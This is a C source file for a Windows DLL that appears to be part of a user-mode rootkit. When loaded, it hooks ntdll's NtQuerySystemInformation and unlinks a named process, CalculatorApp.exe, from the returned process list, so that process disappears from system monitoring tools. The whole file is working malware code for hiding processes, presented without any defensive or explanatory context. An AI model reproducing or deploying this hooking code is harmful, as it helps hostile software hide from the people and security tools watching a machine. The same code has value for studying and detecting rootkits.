#include "rku.h"

unsigned char hide_me[] = "CalculatorApp.exe";
unsigned short whide_me[] = L"CalculatorApp.exe";

typedef NTSTATUS (NTAPI* fpNtQuerySystemInformation)(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID                    SystemInformation,
    ULONG                    SystemInformationLength,
    PULONG                   ReturnLength
);


int hookNt(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID                    SystemInformation,
    ULONG                    SystemInformationLength,
    PULONG                   ReturnLength
){
    fpNtQuerySystemInformation f;
    GVA(&f);
    if (SystemInformation != NULL && SystemInformationClass == SystemProcessInformation){
        NTSTATUS res = 0;
        res = f(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
        if (res != 0x0){
            return res;
        }
        PSYSTEM_PROCESS_INFORMATION SystemProcInfo =  (PSYSTEM_PROCESS_INFORMATION) SystemInformation;
        PSYSTEM_PROCESS_INFORMATION prev = NULL;
        while (TRUE) {
            if (SystemProcInfo->ImageName.Length && wcscmp(SystemProcInfo->ImageName.Buffer, whide_me) == 0) {
                prev->NextEntryOffset =prev->NextEntryOffset+SystemProcInfo->NextEntryOffset;
                break;
            }
            if (!SystemProcInfo->NextEntryOffset)
                break;
            prev = SystemProcInfo;
            SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)SystemProcInfo + SystemProcInfo->NextEntryOffset);
        }
        return res;
    }
    else{
        return f(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
    }
}

BOOL WINAPI DllMain(
    HINSTANCE hinstDLL,  // handle to DLL module
    DWORD fdwReason,     // reason for calling function
    LPVOID lpvReserved )  // reserved
{
    // Perform actions based on the reason for calling.
    switch( fdwReason )
    {
        case DLL_PROCESS_ATTACH:
            HookInfo hNtQ;
            HANDLE nt = GetModuleHandleA("ntdll.dll");
            fpNtQuerySystemInformation pnt = (fpNtQuerySystemInformation)GetProcAddress(nt, "NtQuerySystemInformation");
            InstallHook(pnt, hookNt, &hNtQ);
            break;

        case DLL_THREAD_ATTACH:
         // Do thread-specific initialization.
            break;

        case DLL_THREAD_DETACH:
         // Do thread-specific cleanup.
            break;

        case DLL_PROCESS_DETACH:

            if (lpvReserved != NULL)
            {
                break; // do not do cleanup if process termination scenario
            }

         // Perform any necessary cleanup.
            break;
    }
    return TRUE;  // Successful DLL_PROCESS_ATTACH.
}